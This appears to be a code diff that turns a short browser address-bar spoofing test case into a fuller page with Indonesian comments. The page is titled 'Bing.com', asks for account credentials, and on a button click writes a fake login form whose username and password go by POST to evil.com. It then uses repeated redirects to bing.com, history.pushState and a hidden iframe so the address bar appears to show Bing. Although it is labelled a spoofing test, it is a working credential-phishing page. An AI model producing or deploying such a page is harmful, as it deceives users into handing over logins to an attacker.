@@ -1,8 +1,47 @@
-<script>  
-    function spoof() { 
-        document.write("<html><title>Bing.com</title><iframe src='//evil.com/form.html' width='100%' height='300px'></iframe></html>");  
-        setInterval(function(){document.location="https://bing.com:1234";}, 11119800); 
-    }; 
-</script> 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Bing.com</title>
+</head>
+<body>
+    <h3>Masukkan Kredensial untuk Verifikasi Akun Bing</h3>
+    <button onclick="startSpoof()">Mulai Uji Spoofing</button>
+    
+    <script>
+        function startSpoof() {
+            // Langkah 1: Ubah konten halaman untuk memuat form palsu
+            document.write(`
+                <html>
+                    <title>Bing.com</title>
+                    <form method="POST" action="https://evil.com" name="loginForm">
+                        <label>Login:</label>
+                        <input type="text" name="username"><br>
+                        <label>Password:</label>
+                        <input type="password" name="password"><br>
+                        <input type="submit" value="Login">
+                    </form>
+                </html>
+            `);
 
-<p class="test"><input class="btn btn-success btn-lg" type="button" value="Run test case" onclick="spoof();" />
+            // Langkah 2: Set URL address bar ke `bing.com` menggunakan pengalihan periodik
+            document.location = "https://bing.com:1234";
+            setInterval(() => {
+                document.location = "https://bing.com:1234";
+            }, 11000);  // Interval yang lebih singkat untuk mempertahankan URL
+
+            // Langkah 3: Tambahkan pushState untuk memodifikasi URL tanpa perubahan halaman
+            history.pushState({}, "Bing.com", "/login");
+
+            // Langkah 4: Jalankan pengalihan otomatis pada iframe tersembunyi untuk menjaga konsistensi address bar
+            let hiddenFrame = document.createElement("iframe");
+            hiddenFrame.style.display = "none";
+            hiddenFrame.src = "https://bing.com";
+            document.body.appendChild(hiddenFrame);
+
+            setInterval(() => {
+                hiddenFrame.src = "https://bing.com";
+            }, 15000); // Interval untuk iframe yang lebih panjang untuk menambah stabilitas
+        }
+    </script>
+</body>
+</html>
